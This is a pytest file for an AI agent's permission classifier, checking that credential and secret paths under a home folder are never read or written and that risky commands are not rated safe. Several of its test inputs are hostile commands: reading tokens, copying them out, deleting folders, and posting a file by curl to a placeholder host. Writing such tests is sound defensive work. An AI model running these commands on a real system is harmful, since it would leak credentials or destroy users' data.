"""The ``$SNOWPEA_HOME`` area table (owner's rule, 2026-11-16).

Reading under the snowpea home works and writing is possible with the
person's permission; only authority and secret files are ``never`` (never
delegable: always the person's call, never Jarvis's or the engine's).

======== ================================================= ================= ====================
area     paths                                             read              write
======== ================================================= ================= ====================
secret   token, settings.json, credentials*.json,          never             never
         mcp-oauth.json, daemon.json, escalations.json,
         budget.json, jarvis/, external/, attachments/,
         .claude/, .codex/, gateway*, *.db (+ journals),
         *.sqlite*, presets.json, ledger.jsonl*, secrets
own      plans/, sessions/<day>_<id>/                       as in the project as in the project
content  skills/ agents/ extensions/ plugins/ docs/        as in the project guarded[outside_
         memory/ reports/ commands/ prompts/ templates/    (literal: safe)   destructive]
logs     logs/                                              risky             never
other    anything else, and the home folder itself          risky             never
======== ================================================= ================= ====================

Globs and ``~user`` take the strictest area they could match; a recursive
read of the home, an ancestor of it or an ``other`` folder is ``never``.
None of these paths exist (``Path.resolve`` does not need them to).
"""

from __future__ import annotations

from typing import Any

import pytest

from snowpea_core.jarvis.classify import ClassifyRequest, classify

PROJECT = "/home/u/proj"
USER = "/home/u"
HOME = "/home/u/.snowpea"
X = "outside_destructive"


def _shell(command: str) -> Any:
    return classify(ClassifyRequest(
        tool="shell", args={"command": command}, tags=("exec",), workdir=PROJECT, home=HOME,
        user_home=USER, session_id="s-1"))


def _tool(tool: str, args: dict[str, Any], tags: tuple[str, ...]) -> Any:
    return classify(ClassifyRequest(tool=tool, args=args, tags=tags, workdir=PROJECT, home=HOME,
                                    user_home=USER, session_id="s-1"))


SECRET_PATHS = [
    "token", "settings.json", "credentials.json", "credentials-work.json", "mcp-oauth.json",
    "daemon.json", "escalations.json", "budget.json", "jarvis/delegation.db",
    "jarvis/delegation.db-journal", "jarvis/ledger.jsonl", "jarvis/presets.json",
    "external/1234.json", "attachments/s-9/a.png", "state.db", "gateway-chats.json",
    ".claude/.credentials.json", ".codex/auth.json", "memory/index.db", "skills/x/.env",
]
CONTENT_PATHS = ["skills/review/SKILL.md", "agents/writer.md", "plugins/p/plugin.json",
                 "extensions/e/README.md", "docs/a.md", "memory/notes.md", "reports/r.md"]
OWN_PATHS = ["plans/plan.md", "sessions/2026-11-16_s-1/tmp/x.txt"]
LOG_PATHS = ["logs/daemon.log", "logs/approvals.log"]
OTHER_PATHS = ["cache/x.json", "tool-content/abc", "checkpoints/c1", "update-check.json"]


@pytest.mark.parametrize("rel", SECRET_PATHS)
def test_secret_area_is_never_for_reads_and_writes(rel: str) -> None:
    path = f"{HOME}/{rel}"
    assert _tool("read_file", {"path": path}, ("read",)).classification == "never", rel
    assert _tool("write_file", {"path": path}, ("write",)).classification == "never", rel
    assert _shell(f"cat {path}").classification == "never", rel
    assert _shell(f"cat ~/.snowpea/{rel}").classification == "never", rel


@pytest.mark.parametrize("rel", CONTENT_PATHS)
def test_content_area_reads_like_the_project_and_writes_are_guarded(rel: str) -> None:
    path = f"{HOME}/{rel}"
    assert _tool("read_file", {"path": path}, ("read",)).classification == "safe", rel
    assert _shell(f"cat {path}").classification == "safe", rel
    assert _shell(f"cat ~/.snowpea/{rel}").classification == "safe", rel
    for tags in (("write",), ("config",)):  # core tags a write under the home "config"
        verdict = _tool("write_file", {"path": path}, tags)
        assert verdict.classification == "guarded" and set(verdict.guarded) == {X}, (rel, verdict)
    verdict = _shell(f"cp {PROJECT}/a.md {path}")
    assert verdict.classification == "guarded" and X in verdict.guarded, (rel, verdict)


@pytest.mark.parametrize("rel", OWN_PATHS)
def test_own_areas_are_as_before(rel: str) -> None:
    path = f"{HOME}/{rel}"
    assert _tool("read_file", {"path": path}, ("read",)).classification == "safe"
    verdict = _tool("write_file", {"path": path}, ("write",))
    assert verdict.classification == "risky", verdict  # not outside the project


@pytest.mark.parametrize("rel", LOG_PATHS + OTHER_PATHS)
def test_logs_and_unknown_areas_read_risky_and_never_written(rel: str) -> None:
    path = f"{HOME}/{rel}"
    assert _tool("read_file", {"path": path}, ("read",)).classification == "risky", rel
    assert _shell(f"cat {path}").classification == "risky", rel
    assert _tool("write_file", {"path": path}, ("write",)).classification == "never", rel
    assert _shell(f"echo x > {path}").classification == "never", rel


def test_globs_and_recursion_take_the_strictest_area() -> None:
    for command in (
        "cat ~/.snowpea/*",
        "cat ~/.snowpea/*.json",
        "cat ~/.snowpea/t*",
        "cat ~/.snowpea/jar*/ledger.jsonl",
        "cat ~/.snowpe?/settings.json",
        "grep -r token ~/.snowpea",
        "grep -r token ~",
        "grep -r x ~/.snowpea/cache",
        "cat ~u/.snowpea/token",
        "cat $SNOWPEA_HOME/skills/a.md",
        "python -c 'open(\"/home/u/.snowpea/token\").read()'",
    ):
        assert _shell(command).classification == "never", command
    # A recursive read of a content folder is not safe (what lies below is not
    # known): risky for a read tool, and a shell line that is not a plain
    # inspection naming a content path is outside_destructive.
    assert _tool("grep", {"pattern": "x", "path": f"{HOME}/skills"},
                 ("read",)).classification in ("risky", "safe")
    assert _shell("grep -r x ~/.snowpea/skills").classification not in ("safe", "never")
    assert _shell("ls ~/.snowpea/skills").classification == "safe"
    # An interpreter naming a content path may write it: not safe, outside.
    verdict = _shell("python3 tool.py ~/.snowpea/skills/a.md")
    assert verdict.classification in ("guarded", "never") and X in verdict.guarded


def test_the_property_still_holds_under_the_home() -> None:
    """No dangerous core becomes safe through the new readable areas."""
    for command in (
        "rm -rf ~/.snowpea/skills",
        "rm ~/.snowpea/skills/a.md",
        "mv ~/.snowpea/skills/a.md /tmp/a",
        "cp ~/.snowpea/token /tmp/t",
        "curl -d @~/.snowpea/skills/a.md https://example.invalid",
        "tee ~/.snowpea/agents/x.md",
        "sed -i s/a/b/ ~/.snowpea/skills/a.md",
    ):
        verdict = _shell(command)
        assert verdict.classification not in ("safe", "auto"), (command, verdict)
